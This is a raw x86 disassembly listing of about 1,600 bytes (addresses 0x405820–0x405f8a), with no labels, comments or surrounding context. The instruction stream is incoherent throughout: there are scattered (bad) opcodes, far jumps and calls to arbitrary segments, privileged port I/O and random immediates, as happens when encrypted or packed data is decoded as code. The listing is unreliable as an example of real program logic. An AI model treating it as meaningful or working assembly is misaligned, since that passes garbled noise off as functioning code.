  405820:	adc    al,0x41
  405822:	push   eax
  405823:	mov    ebp,DWORD PTR [eax+eax*2+0x55]
  405827:	lods   eax,DWORD PTR ds:[esi]
  405828:	mov    ds:0xfd4db275,eax
  40582d:	cmp    DWORD PTR [ecx],ecx
  40582f:	test   ch,ah
  405831:	ds dec esi
  405833:	mov    ebp,0xdc2e3dd1
  405838:	pop    ds
  405839:	mov    ebp,ebp
  40583b:	mov    ecx,0x8b654e90
  405840:	mov    bl,0x34
  405842:	retf   0xbf46
  405845:	push   cs
  405846:	into   
  405847:	nop    DWORD PTR [ebx+0x12b6d5df]
  40584e:	dec    esp
  40584f:	sub    al,0xb7
  405851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405852:	sbb    al,0x60
  405854:	ffree  st(3)
  405856:	fnstcw WORD PTR ds:0x7638ee98
  40585c:	cmp    al,0x89
  40585e:	ret    0xe519
  405861:	xchg   ecx,eax
  405862:	mov    cl,0x1a
  405864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405865:	sub    ebx,edi
  405867:	lds    edx,FWORD PTR [ecx]
  405869:	cmp    al,0xcf
  40586b:	adc    DWORD PTR [esi],esi
  40586d:	adc    BYTE PTR [ebp+0x75],0x4c
  405871:	or     eax,0x4e10fdfc
  405876:	sbb    dh,dl
  405878:	sbb    eax,0x52242fd0
  40587d:	popf   
  40587e:	mov    ds:0x75ef64cc,al
  405883:	in     al,0x86
  405885:	push   ecx
  405886:	sub    edx,ecx
  405888:	mov    eax,ds:0xab8d6b4
  40588d:	mov    al,0x96
  40588f:	lock ins BYTE PTR es:[edi],dx
  405891:	stos   BYTE PTR es:[edi],al
  405892:	and    bh,ah
  405894:	cli    
  405895:	ficomp WORD PTR ds:0xd0f8a092
  40589b:	lock and al,bh
  40589e:	imul   ebx,DWORD PTR [edx+0x42c0eb8f],0x5334a5c4
  4058a8:	pusha  
  4058a9:	jbe    0x405860
  4058ab:	jb     0x405875
  4058ad:	or     cl,ch
  4058af:	punpckldq mm7,mm0
  4058b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058b3:	xor    ebx,DWORD PTR [edi]
  4058b5:	push   ebp
  4058b6:	xchg   esi,eax
  4058b7:	fild   DWORD PTR [esi]
  4058b9:	adc    al,0x1f
  4058bb:	loopne 0x4058eb
  4058bd:	ret    
  4058be:	and    ebx,edi
  4058c0:	xchg   ebx,eax
  4058c1:	sub    esp,ecx
  4058c3:	outs   dx,BYTE PTR ds:[esi]
  4058c4:	sti    
  4058c5:	and    DWORD PTR [ebp+0x53],eax
  4058c8:	call   0x757f:0xe450d6ca
  4058cf:	dec    eax
  4058d0:	mov    esp,0x686880a4
  4058d5:	push   es
  4058d6:	xor    BYTE PTR [ecx+0x458a3543],bl
  4058dc:	xchg   edi,eax
  4058dd:	pop    esp
  4058de:	mov    dh,0x13
  4058e0:	lock lods al,BYTE PTR ds:[esi]
  4058e2:	sub    edx,DWORD PTR [ecx-0x1e]
  4058e5:	xor    BYTE PTR [ecx-0x6],dl
  4058e8:	mov    BYTE PTR [ebx+0x26],dl
  4058eb:	jmp    0x954b:0x1fda56c2
  4058f2:	dec    eax
  4058f3:	stos   DWORD PTR es:[edi],eax
  4058f4:	add    eax,0x7b681229
  4058f9:	or     al,0xb5
  4058fb:	mov    eax,0x442126bc
  405900:	and    al,0x4e
  405902:	cmp    edi,eax
  405904:	jl     0x405973
  405906:	aas    
  405907:	(bad)  
  405908:	(bad)  
  405909:	sbb    ah,bl
  40590b:	pop    ecx
  40590c:	jge    0x405963
  40590e:	je     0x40596b
  405910:	xlat   BYTE PTR ds:[ebx]
  405911:	leave  
  405912:	retf   0x7c89
  405915:	mov    eax,ds:0xec22cb8
  40591a:	add    eax,0xc5d1e9a6
  40591f:	into   
  405920:	jns    0x4058dd
  405922:	in     eax,0xda
  405924:	jge    0x40596b
  405926:	push   cs
  405927:	adc    ah,cl
  405929:	push   ebx
  40592a:	xlat   BYTE PTR ds:[ebx]
  40592b:	inc    ebp
  40592c:	push   ss
  40592d:	push   ecx
  40592e:	and    DWORD PTR [edi-0xdd0dbd5],edi
  405934:	inc    edx
  405935:	cmc    
  405936:	dec    ebx
  405937:	les    esp,FWORD PTR [esi-0x14]
  40593a:	mov    eax,0xc81dd94
  40593f:	inc    esp
  405940:	into   
  405941:	add    DWORD PTR [edx+0x4ad8c76d],esi
  405947:	and    ecx,DWORD PTR ds:0x4f0b5cde
  40594d:	fprem  
  40594f:	mov    dl,0xe4
  405951:	and    ah,BYTE PTR [ebp+esi*4-0x5f]
  405955:	es popa 
  405957:	jp     0x405963
  405959:	adc    al,0xc5
  40595b:	test   eax,0xdf593996
  405960:	std    
  405961:	cli    
  405962:	jno    0x40592a
  405964:	(bad)  
  405966:	jns    0x405996
  405968:	inc    esp
  405969:	fs int3 
  40596b:	sar    bh,1
  40596d:	push   0x63
  40596f:	cdq    
  405970:	xchg   BYTE PTR [edi+eiz*1+0x67],ah
  405974:	adc    al,0x95
  405976:	ins    BYTE PTR es:[edi],dx
  405977:	cmp    DWORD PTR [ecx],0x2667c420
  40597d:	cmp    eax,DWORD PTR [edx+ebp*8]
  405980:	pop    ds
  405981:	fsub   DWORD PTR [eax-0x38f90b92]
  405987:	mov    dl,0xa3
  405989:	add    al,0xf
  40598b:	fs out dx,eax
  40598d:	or     BYTE PTR [ebx+ebx*2],bh
  405990:	mov    ecx,0x1748abda
  405995:	pop    edx
  405996:	scas   eax,DWORD PTR es:[edi]
  405997:	push   esp
  405998:	cs mov ebp,eax
  40599b:	mov    BYTE PTR [edx+0x52f19316],dh
  4059a1:	stos   DWORD PTR es:[edi],eax
  4059a2:	mov    esi,0x67282801
  4059a7:	xor    eax,0x85d2f6d2
  4059ac:	loop   0x405a1c
  4059ae:	adc    al,bh
  4059b0:	lods   al,BYTE PTR ds:[esi]
  4059b1:	aaa    
  4059b2:	daa    
  4059b3:	sti    
  4059b4:	iret   
  4059b5:	pop    esi
  4059b6:	push   ss
  4059b7:	out    dx,al
  4059b8:	dec    esp
  4059b9:	stc    
  4059ba:	push   eax
  4059bb:	jg     0x405999
  4059bd:	and    cl,BYTE PTR [ebp+0x5f]
  4059c0:	sub    BYTE PTR [esp+esi*8-0x7c66d10b],ah
  4059c7:	mov    cl,0x74
  4059c9:	sti    
  4059ca:	aaa    
  4059cb:	push   ebp
  4059cc:	leave  
  4059cd:	inc    ecx
  4059ce:	or     cl,cl
  4059d0:	scas   al,BYTE PTR es:[edi]
  4059d1:	fdiv   QWORD PTR [eax]
  4059d3:	enter  0x3a90,0xc7
  4059d7:	and    al,0xd4
  4059d9:	dec    ebx
  4059da:	es scas al,BYTE PTR es:[edi]
  4059dc:	imul   ebp,DWORD PTR [ecx-0x64],0xe3b2bca9
  4059e3:	inc    edi
  4059e4:	in     eax,dx
  4059e5:	gs retf 
  4059e7:	cmp    DWORD PTR [ebx],edi
  4059e9:	scas   al,BYTE PTR es:[edi]
  4059ea:	das    
  4059eb:	sub    eax,0x646cc725
  4059f0:	aam    0xdc
  4059f2:	cmp    eax,0xe7dd0e57
  4059f7:	neg    DWORD PTR ds:0x46603899
  4059fd:	pop    esp
  4059fe:	add    al,0x28
  405a00:	sbb    eax,0xbb1818a4
  405a05:	pop    es
  405a06:	in     al,dx
  405a07:	jno    0x405a65
  405a09:	mov    ch,BYTE PTR [esi-0x4e41fcad]
  405a0f:	mov    al,0x34
  405a11:	xor    ecx,DWORD PTR [edx+edi*1+0x58e4a14d]
  405a18:	aad    0xc5
  405a1a:	xor    ebx,DWORD PTR [ebx]
  405a1c:	or     DWORD PTR [ebp-0x72],edx
  405a1f:	mov    DWORD PTR [edi],0x5031ea94
  405a25:	mov    edi,DWORD PTR [esi+0x2f]
  405a28:	sub    al,0x1
  405a2a:	loope  0x405a9a
  405a2c:	scas   al,BYTE PTR es:[edi]
  405a2d:	jbe    0x4059b8
  405a2f:	add    al,0xd7
  405a31:	or     BYTE PTR [ebx],al
  405a33:	enter  0x539,0x45
  405a37:	dec    esp
  405a38:	test   DWORD PTR [eax],ebp
  405a3a:	lds    edx,FWORD PTR [edi+0x1d0815b0]
  405a40:	pusha  
  405a41:	test   BYTE PTR [ecx+eax*8],bl
  405a44:	pop    ebp
  405a45:	cdq    
  405a46:	pop    ebp
  405a47:	cmc    
  405a48:	mov    edi,0x3278aaaa
  405a4d:	xchg   edi,eax
  405a4e:	add    BYTE PTR [edi+0x28],0xb1
  405a52:	inc    edx
  405a53:	sar    dh,1
  405a55:	out    dx,eax
  405a56:	xchg   ecx,eax
  405a57:	mov    BYTE PTR [esi-0x726412f9],dl
  405a5d:	fld    TBYTE PTR [eax-0x479e179e]
  405a63:	mov    al,ds:0xa68a838d
  405a68:	test   eax,0xf9d85b30
  405a6d:	cmp    dl,BYTE PTR [ebx-0x22]
  405a70:	mul    bh
  405a72:	cmp    BYTE PTR [edi+0x5b],ah
  405a75:	test   BYTE PTR [ebp-0x5c],bh
  405a78:	pusha  
  405a79:	in     eax,0x49
  405a7b:	imul   DWORD PTR [edx+0x47]
  405a7e:	mov    eax,ds:0x4d2627bb
  405a83:	mov    WORD PTR [ebp+0x27],cs
  405a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a87:	mov    ds,WORD PTR [edi-0x7d9e9df3]
  405a8d:	fidiv  WORD PTR [edi+0x295e615c]
  405a93:	popf   
  405a94:	(bad)  
  405a95:	(bad)  
  405a96:	jmp    0x405a3c
  405a98:	push   cs
  405a99:	loopne 0x405a66
  405a9b:	mov    al,ds:0xe9523177
  405aa0:	(bad)  
  405aa1:	and    eax,0xd3a338b5
  405aa6:	call   DWORD PTR [ebp+edx*4-0x258fdb3b]
  405aad:	and    ecx,DWORD PTR [esi]
  405aaf:	cmp    al,0xd4
  405ab2:	fiadd  WORD PTR ds:0xe9a6c5c8
  405ab8:	outs   dx,DWORD PTR ds:[esi]
  405ab9:	mov    edx,0x2e8b9c6b
  405abe:	mov    DWORD PTR [edx],ecx
  405ac0:	das    
  405ac1:	add    edi,0xf780a860
  405ac7:	shl    DWORD PTR [ecx+edi*1+0x31],0xa2
  405acc:	sub    eax,ecx
  405ace:	nop
  405acf:	jmp    0x104ee552
  405ad4:	push   ebp
  405ad5:	cmp    al,0x9b
  405ad7:	aas    
  405ad8:	sbb    ebp,DWORD PTR [ebx-0x79ce8d35]
  405ade:	cs and eax,0xa2628e17
  405ae4:	out    0xf4,eax
  405ae6:	sub    ah,0x3
  405ae9:	add    bh,BYTE PTR [ecx-0x646d9d98]
  405aef:	pop    edx
  405af0:	add    ebp,DWORD PTR [ebx+0x3121556f]
  405af6:	jae    0x405aad
  405af8:	add    DWORD PTR [ecx-0x5805a35f],0x4da1d3e3
  405b02:	inc    esp
  405b03:	jb     0x405ad8
  405b05:	rol    BYTE PTR [edx],cl
  405b07:	xor    eax,esi
  405b09:	pop    ebx
  405b0a:	xor    bl,BYTE PTR [eax-0x59]
  405b0d:	es aam 0x71
  405b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b11:	ret    0xa95b
  405b14:	les    esp,FWORD PTR [ebx]
  405b16:	mov    esi,0xe29e49e0
  405b1b:	test   BYTE PTR fs:0x1b071240,ch
  405b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b23:	pusha  
  405b24:	scas   eax,DWORD PTR es:[edi]
  405b25:	fwait
  405b26:	rcr    DWORD PTR [esi-0x62],cl
  405b29:	xchg   ecx,eax
  405b2a:	cmc    
  405b2b:	fmul   QWORD PTR [eax+esi*2]
  405b2e:	and    edi,ebx
  405b30:	(bad)  
  405b31:	mul    al
  405b33:	sahf   
  405b34:	in     al,0xd5
  405b36:	or     DWORD PTR [eax+0x6a],0xffffffe4
  405b3a:	bound  esp,QWORD PTR [ebx+ebp*4]
  405b3d:	mov    al,0x66
  405b3f:	inc    eax
  405b40:	in     al,dx
  405b41:	lds    ebx,FWORD PTR [esi]
  405b43:	cwde   
  405b44:	arpl   WORD PTR ds:0x21b4b322,cx
  405b4a:	mov    eax,0xfc3b774d
  405b4f:	fadd   st(1),st
  405b51:	jno    0x405ad3
  405b53:	pop    ebx
  405b54:	adc    al,BYTE PTR [edi+eiz*8-0x11bb85ae]
  405b5b:	inc    cx
  405b5d:	stc    
  405b5e:	je     0x405b78
  405b60:	inc    eax
  405b61:	push   bx
  405b63:	es inc ebx
  405b65:	mov    esp,0x968a5352
  405b6a:	retf   
  405b6b:	out    dx,eax
  405b6c:	ret    
  405b6d:	fisttp WORD PTR [ebp-0x297c504b]
  405b73:	jb     0x405bc6
  405b75:	das    
  405b76:	scas   eax,DWORD PTR es:[edi]
  405b77:	cmp    cl,dl
  405b79:	outs   dx,DWORD PTR ds:[esi]
  405b7a:	sub    al,0x94
  405b7c:	sbb    dl,BYTE PTR [ebx-0x69ce1eb1]
  405b82:	fist   DWORD PTR [ecx+0x1b]
  405b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b86:	dec    ebx
  405b87:	cmp    DWORD PTR [edx-0x8],0xffffffa5
  405b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b8c:	push   0xb5f385c4
  405b91:	div    bh
  405b93:	pop    ds
  405b94:	cmp    ebx,DWORD PTR [edi]
  405b96:	scas   eax,DWORD PTR es:[edi]
  405b97:	popf   
  405b98:	cwde   
  405b99:	pop    ecx
  405b9a:	sub    esi,ebx
  405b9c:	push   ecx
  405b9d:	arpl   WORD PTR [edx+0x33],bx
  405ba0:	ja     0x405b8b
  405ba2:	ins    BYTE PTR es:[edi],dx
  405ba3:	fdiv   DWORD PTR [edi+0x8]
  405ba6:	jg     0x405c05
  405ba8:	mov    ch,0xac
  405baa:	and    al,0x6e
  405bac:	inc    edi
  405bad:	popa   
  405bae:	jae    0x405b50
  405bb0:	lods   al,BYTE PTR ds:[esi]
  405bb1:	js     0x405be9
  405bb3:	adc    DWORD PTR [eax],ebp
  405bb5:	push   0x51
  405bb7:	fisubr WORD PTR [ebp-0x46]
  405bba:	pop    edi
  405bbb:	dec    ebx
  405bbc:	in     al,0xaf
  405bbe:	leave  
  405bbf:	inc    ebx
  405bc0:	mov    BYTE PTR [ebx],al
  405bc2:	ficomp WORD PTR [edx-0x514f126]
  405bc8:	scas   eax,DWORD PTR es:[edi]
  405bc9:	push   es
  405bca:	dec    ecx
  405bcb:	dec    edx
  405bcc:	sbb    al,0x31
  405bce:	push   0x52
  405bd0:	sahf   
  405bd1:	jmp    0xd18a:0xf9c19af3
  405bd8:	push   ecx
  405bd9:	popf   
  405bda:	adc    cl,BYTE PTR [eax-0x5ee61f6]
  405be0:	fneni(8087 only) 
  405be2:	xchg   ebx,eax
  405be3:	fcom   QWORD PTR [esi]
  405be5:	scas   eax,DWORD PTR es:[edi]
  405be6:	and    eax,0x6b2de4ab
  405beb:	dec    ebx
  405bec:	popa   
  405bed:	dec    ebp
  405bee:	xor    BYTE PTR [edx+0x1b],dh
  405bf1:	dec    esi
  405bf2:	push   esi
  405bf3:	adc    BYTE PTR [eax+eax*4+0x1],dh
  405bf7:	out    dx,eax
  405bf8:	idiv   DWORD PTR [ebx+eiz*8-0x166a3370]
  405bff:	scas   eax,DWORD PTR es:[edi]
  405c00:	dec    edi
  405c01:	scas   eax,DWORD PTR es:[edi]
  405c02:	inc    edx
  405c03:	repnz dec eax
  405c05:	jmp    0xa33:0x3f0105a2
  405c0c:	jnp    0x405c16
  405c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c0f:	mov    edi,DWORD PTR [edi+eiz*2+0x7c]
  405c13:	div    DWORD PTR [ecx-0xf]
  405c16:	mov    cl,0xd0
  405c18:	shl    BYTE PTR [edx+0x4e],0x80
  405c1c:	aaa    
  405c1d:	test   DWORD PTR [eax],eax
  405c1f:	pop    ebp
  405c20:	out    dx,al
  405c21:	(bad)  
  405c22:	aam    0x1
  405c24:	xchg   edx,eax
  405c25:	in     al,0x20
  405c27:	sub    BYTE PTR [edi],0x2c
  405c2a:	jbe    0x405c3b
  405c2c:	ja     0x405c7a
  405c2e:	adc    BYTE PTR [ebx+0x2cea20fa],bl
  405c34:	mov    WORD PTR [edi-0x1e],?
  405c37:	add    BYTE PTR [edi],0x6
  405c3a:	fmul   QWORD PTR [ecx+0x17]
  405c3d:	stos   DWORD PTR es:[edi],eax
  405c3e:	rol    BYTE PTR [edx],cl
  405c40:	fldcw  WORD PTR [ecx]
  405c42:	cmc    
  405c43:	xchg   edi,eax
  405c44:	add    ch,BYTE PTR [edi]
  405c46:	sub    bh,ah
  405c48:	adc    cl,BYTE PTR [ebx]
  405c4a:	iret   
  405c4b:	mov    BYTE PTR [edi-0x33],al
  405c4e:	or     ebx,edi
  405c50:	popa   
  405c51:	xchg   ebp,eax
  405c52:	inc    esi
  405c53:	test   eax,0x91cb1fa3
  405c58:	sar    DWORD PTR [eax+ecx*8],cl
  405c5b:	ds push esp
  405c5d:	jae    0x405c11
  405c5f:	mov    ebp,0xf901f84f
  405c64:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  405c66:	jo     0x405c8c
  405c68:	mov    ecx,esp
  405c6a:	rcr    DWORD PTR [edx+0x63],1
  405c6d:	dec    esp
  405c6e:	jecxz  0x405ca8
  405c70:	repnz cmp al,0x92
  405c73:	mov    ss,WORD PTR [ebp-0x84eeced]
  405c79:	div    esp
  405c7b:	outs   dx,DWORD PTR ds:[esi]
  405c7c:	xor    eax,0x36eeefcc
  405c81:	repnz outs dx,BYTE PTR ds:[esi]
  405c83:	jl     0x405c40
  405c85:	mov    BYTE PTR [eax+0x15],bl
  405c88:	cdq    
  405c89:	inc    esi
  405c8a:	mov    ah,0xb5
  405c8c:	adc    dl,BYTE PTR [ebx]
  405c8e:	fsub   DWORD PTR [edx-0x61]
  405c91:	sub    eax,0x5f31be00
  405c96:	mov    ebx,DWORD PTR [esi-0x49]
  405c99:	bnd addr16 jae 0x405cf4
  405c9d:	mov    edx,0xf80c9f1a
  405ca2:	jp     0x405cd6
  405ca4:	dec    edi
  405ca5:	dec    eax
  405ca6:	lods   al,BYTE PTR gs:[esi]
  405ca8:	imul   ebx,DWORD PTR [ebp-0xb179001],0xffffffb6
  405caf:	scas   al,BYTE PTR es:[edi]
  405cb0:	push   ds
  405cb1:	sub    edi,DWORD PTR [eax+0x1eaf640a]
  405cb7:	test   BYTE PTR [ebx],0xd3
  405cba:	aad    0x2b
  405cbc:	(bad)  
  405cbd:	adc    BYTE PTR [ebx-0x1c],dh
  405cc0:	or     eax,0xc8a23540
  405cc5:	outs   dx,BYTE PTR cs:[esi]
  405cc7:	mov    eax,DWORD PTR [eax]
  405cc9:	jp     0x405c81
  405ccb:	pop    eax
  405ccc:	scas   al,BYTE PTR es:[edi]
  405ccd:	cmp    al,0xd3
  405ccf:	popa   
  405cd0:	(bad)  
  405cd1:	cmp    dh,BYTE PTR [ecx+0x7f605190]
  405cd7:	cwde   
  405cd8:	test   al,0xba
  405cda:	popa   
  405cdb:	mov    al,BYTE PTR [esi-0x43]
  405cde:	call   0xe052:0x87945e6
  405ce5:	scas   eax,DWORD PTR es:[edi]
  405ce6:	or     al,0xc3
  405ce8:	mov    al,BYTE PTR [edi+0x46]
  405ceb:	mov    al,ds:0x678c58e0
  405cf0:	add    bh,cl
  405cf2:	inc    edx
  405cf3:	addr16 jge 0x405ceb
  405cf6:	int3   
  405cf7:	fisttp DWORD PTR [edi]
  405cf9:	pop    es
  405cfa:	popf   
  405cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cfc:	pushf  
  405cfd:	and    eax,0xe6ed0fd1
  405d02:	xchg   esi,eax
  405d03:	std    
  405d04:	mov    ah,0xca
  405d06:	ja     0x405c9a
  405d08:	mov    ebp,0x3312adf5
  405d0d:	mov    esp,?
  405d0f:	pop    edi
  405d10:	jmp    0xedc068da
  405d15:	jno    0x405cae
  405d17:	xchg   ebx,eax
  405d18:	in     eax,0x18
  405d1a:	jp     0x405d03
  405d1c:	mov    edx,0x29b287d3
  405d21:	sbb    eax,0xe0d56b5b
  405d26:	aaa    
  405d27:	dec    esp
  405d28:	arpl   WORD PTR [edi+0x49fe3a3e],bx
  405d2e:	push   edi
  405d2f:	sti    
  405d30:	push   edi
  405d31:	cmp    ch,BYTE PTR [ecx]
  405d33:	xchg   edx,eax
  405d34:	sahf   
  405d35:	push   cs
  405d36:	cdq    
  405d37:	sub    al,dh
  405d39:	mov    eax,ds:0xefc0c047
  405d3e:	cli    
  405d3f:	retf   0x41be
  405d42:	sbb    DWORD PTR [ecx+0x17557146],edx
  405d48:	test   DWORD PTR [eax],0xe79c10e5
  405d4e:	dec    eax
  405d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d50:	xlat   BYTE PTR ds:[ebx]
  405d51:	shl    BYTE PTR [ebx+0x7358700b],0x43
  405d58:	imul   edx,DWORD PTR [eax+esi*4],0x72
  405d5c:	pop    esi
  405d5d:	fucomi st,st(4)
  405d5f:	sbb    esp,DWORD PTR [eax+eax*8]
  405d62:	or     esi,DWORD PTR [ebx]
  405d64:	cmp    BYTE PTR [edi+edi*2],bl
  405d67:	scas   al,BYTE PTR es:[edi]
  405d68:	test   al,0xb5
  405d6a:	mov    dl,0x56
  405d6c:	xor    DWORD PTR [eax+edx*4+0x3],edx
  405d70:	push   es
  405d71:	jnp    0x405de2
  405d73:	repnz es daa 
  405d76:	popf   
  405d77:	pop    edi
  405d78:	mov    ebp,0x740d7edf
  405d7d:	fmul   QWORD PTR [esi-0x2f72a176]
  405d83:	(bad)  
  405d84:	fisttp QWORD PTR [esi]
  405d86:	add    ch,BYTE PTR [edx+0x51]
  405d89:	pop    eax
  405d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8b:	sub    ch,BYTE PTR [ebx+edi*8+0xa]
  405d8f:	out    0x5,eax
  405d91:	xchg   esi,eax
  405d92:	idiv   bl
  405d94:	adc    ecx,esi
  405d96:	sub    eax,0x100b88da
  405d9b:	xor    ch,BYTE PTR [edi]
  405d9d:	leave  
  405d9e:	into   
  405d9f:	arpl   WORD PTR [edx],bx
  405da1:	out    0xff,al
  405da3:	push   esp
  405da4:	stos   DWORD PTR es:[edi],eax
  405da5:	mov    esp,0xab541699
  405daa:	ds (bad) 
  405dac:	les    edx,FWORD PTR [ecx+0x64]
  405daf:	dec    eax
  405db0:	mov    edi,DWORD PTR [ecx+edi*4]
  405db3:	je     0x405d53
  405db5:	mov    ah,0xdb
  405db7:	popa   
  405db8:	popf   
  405db9:	in     eax,dx
  405dba:	lss    ebp,FWORD PTR [edx+0x1f]
  405dbe:	out    0x4b,eax
  405dc0:	fsubr  QWORD PTR [edi+ecx*4]
  405dc3:	pop    esp
  405dc4:	popa   
  405dc5:	jmp    0x405de7
  405dc7:	outs   dx,BYTE PTR ds:[esi]
  405dc8:	and    eax,0x84b23ffd
  405dcd:	iret   
  405dce:	xchg   esp,eax
  405dcf:	in     al,0x7e
  405dd1:	mov    eax,ds:0x8306f908
  405dd6:	pop    eax
  405dd7:	push   ecx
  405dd8:	mov    WORD PTR [esp+ecx*1],es
  405ddb:	push   es
  405ddc:	pop    ds
  405ddd:	mov    ecx,0xa322cac3
  405de2:	out    0x4b,eax
  405de4:	bound  eax,QWORD PTR [ebx]
  405de6:	xor    dh,dl
  405de8:	shl    BYTE PTR [ebx-0x2d38786b],cl
  405dee:	call   0x9e81:0x9a8d1fcb
  405df5:	mov    al,0xdb
  405df7:	pop    ebx
  405df8:	mov    ecx,0xd2a53ac5
  405dfd:	jbe    0x405e39
  405dff:	add    al,0xd1
  405e01:	stc    
  405e02:	(bad)  
  405e03:	xlat   BYTE PTR ds:[ebx]
  405e04:	out    dx,al
  405e05:	out    0x15,eax
  405e07:	mov    bh,0x45
  405e09:	les    edi,FWORD PTR [ecx-0x1f]
  405e0c:	rcl    BYTE PTR [esi+0x2b],cl
  405e0f:	add    DWORD PTR [edi],ebx
  405e11:	inc    ecx
  405e12:	inc    esp
  405e13:	stc    
  405e14:	sbb    eax,0x3f51e18d
  405e19:	push   esi
  405e1a:	mov    dl,0x4c
  405e1c:	bound  edx,QWORD PTR [ebx-0x2c]
  405e1f:	hlt    
  405e20:	daa    
  405e21:	ret    0xc45e
  405e24:	rol    BYTE PTR [ecx+ebp*1-0x27e9c5f0],0xd
  405e2c:	out    dx,eax
  405e2d:	and    al,0xdc
  405e2f:	jne    0x405e76
  405e31:	dec    esp
  405e32:	and    dh,BYTE PTR [edi+0x34a23fec]
  405e38:	not    BYTE PTR [eax-0x5e6a941b]
  405e3e:	inc    ebx
  405e3f:	sar    BYTE PTR [esi],1
  405e41:	pushf  
  405e42:	sub    esp,DWORD PTR [ecx]
  405e44:	std    
  405e45:	xchg   edi,eax
  405e46:	fcomp  DWORD PTR [ebp-0x10]
  405e49:	pusha  
  405e4a:	call   0xaa93:0x4dc7
  405e50:	dec    ebp
  405e51:	push   edx
  405e52:	addr16 jae 0x405ddc
  405e55:	pop    esp
  405e56:	sbb    eax,0x2ace2252
  405e5c:	mov    cl,0x80
  405e5e:	mov    ecx,0x2875bbf0
  405e63:	xchg   edx,eax
  405e64:	fwait
  405e65:	shr    BYTE PTR [ecx-0x541d4175],cl
  405e6b:	mov    edi,0x8ff3c6fa
  405e70:	cmp    edi,DWORD PTR [ecx+0x56c8ccb7]
  405e76:	and    edx,DWORD PTR [ecx]
  405e78:	(bad)  
  405e79:	or     ebp,DWORD PTR [ecx+ebx*8-0x1b]
  405e7d:	inc    edi
  405e7e:	xchg   edx,eax
  405e7f:	les    eax,FWORD PTR [ebp+0x3f]
  405e82:	push   esp
  405e83:	sar    DWORD PTR ds:0x3d9388fb,cl
  405e89:	bound  ebx,QWORD PTR [eax+0x7a023e42]
  405e8f:	int    0xa7
  405e91:	fsubr  QWORD PTR [ebx-0x787467dd]
  405e97:	fstp   QWORD PTR [edx]
  405e99:	or     DWORD PTR [edx+0x5d],esi
  405e9c:	outs   dx,DWORD PTR ds:[esi]
  405e9d:	outs   dx,BYTE PTR ds:[esi]
  405e9e:	aam    0xa0
  405ea0:	adc    esi,esp
  405ea2:	mov    cl,0x65
  405ea4:	and    al,0x0
  405ea6:	dec    edx
  405ea7:	and    esi,DWORD PTR [esi-0x29]
  405eaa:	sbb    bl,cl
  405eac:	stos   BYTE PTR es:[edi],al
  405ead:	outs   dx,DWORD PTR ds:[esi]
  405eae:	xor    esi,DWORD PTR [ecx+0x1434d7a7]
  405eb4:	iret   
  405eb5:	xchg   BYTE PTR [ebx],bh
  405eb7:	xlat   BYTE PTR ds:[ebx]
  405eb8:	sbb    ebx,DWORD PTR [eax+0x28584aac]
  405ebe:	pop    ss
  405ebf:	sti    
  405ec0:	fisubr WORD PTR [esi+0x3a9cf98d]
  405ec6:	cs fadd st,st(7)
  405ec9:	inc    eax
  405eca:	push   ebx
  405ecb:	pop    edi
  405ecc:	mov    ah,0xdb
  405ece:	mov    edx,DWORD PTR [ecx+eax*8]
  405ed1:	rcl    DWORD PTR [ebx+0x18f1b393],cl
  405ed7:	push   cs
  405ed8:	mov    esp,DWORD PTR ds:0xe8dbf21e
  405ede:	mov    WORD PTR [ecx],es
  405ee0:	int3   
  405ee1:	stos   DWORD PTR es:[edi],eax
  405ee2:	repnz lock test eax,0x8873960a
  405ee9:	mov    bh,BYTE PTR [ebp+0x7a136c84]
  405eef:	jp     0x405e75
  405ef1:	adc    eax,0x707df4bc
  405ef6:	inc    eax
  405ef7:	fdiv   QWORD PTR [ebx-0x5400e1b6]
  405efd:	jno    0x405f4a
  405eff:	jns    0x405eca
  405f01:	sub    edx,DWORD PTR [edi+0x396bff98]
  405f07:	lea    edx,[edi+0x17]
  405f0a:	or     ch,BYTE PTR [ebp+0x6]
  405f0d:	sbb    BYTE PTR [esi+0x53],0x30
  405f11:	out    0xbd,eax
  405f13:	out    dx,eax
  405f14:	jge    0x405f3f
  405f16:	dec    eax
  405f17:	call   0xb469555b
  405f1c:	jae    0x405f87
  405f1e:	or     al,0x16
  405f20:	xchg   esp,eax
  405f21:	cli    
  405f22:	imul   ecx,DWORD PTR [esi],0x18
  405f25:	mov    ebp,0xbce14327
  405f2a:	(bad)
  405f2d:	mov    bh,0xe0
  405f2f:	mov    dl,ch
  405f31:	and    edi,0x12538111
  405f37:	or     al,0x5e
  405f39:	mov    dl,0x24
  405f3b:	push   edx
  405f3c:	adc    dl,0x74
  405f3f:	dec    ecx
  405f40:	(bad)  
  405f41:	sub    eax,0xbbd42c57
  405f46:	sbb    ebp,DWORD PTR [edi-0x6a]
  405f49:	mov    bh,0x7e
  405f4b:	xor    ecx,esi
  405f4d:	pushf  
  405f4e:	aas    
  405f4f:	sbb    edi,edi
  405f51:	xchg   DWORD PTR [ebx-0x3],eax
  405f54:	mov    cl,0xd5
  405f56:	sub    bh,BYTE PTR [eax-0x5c7ea547]
  405f5c:	pushf  
  405f5d:	sub    dl,bh
  405f5f:	and    al,0x43
  405f61:	push   ebx
  405f62:	xor    ebx,DWORD PTR [edi]
  405f64:	jmp    0x405f4a
  405f66:	adc    ch,BYTE PTR [esi]
  405f68:	mov    dl,0x3e
  405f6a:	sbb    edx,DWORD PTR [ebp+0x7a]
  405f6d:	jno    0x405f11
  405f6f:	push   edx
  405f70:	cmp    edx,DWORD PTR [esi-0x25f1f5a]
  405f76:	push   ebp
  405f77:	pushf  
  405f78:	jb     0x405f17
  405f7a:	inc    esp
  405f7b:	xor    edi,DWORD PTR [ebp+0x5de89274]
  405f81:	fstp   DWORD PTR [ecx]
  405f83:	cmp    eax,0xed2f24a6
  405f88:	jle    0x405f40
  405f8a:	add    eax,0xa0fd924b
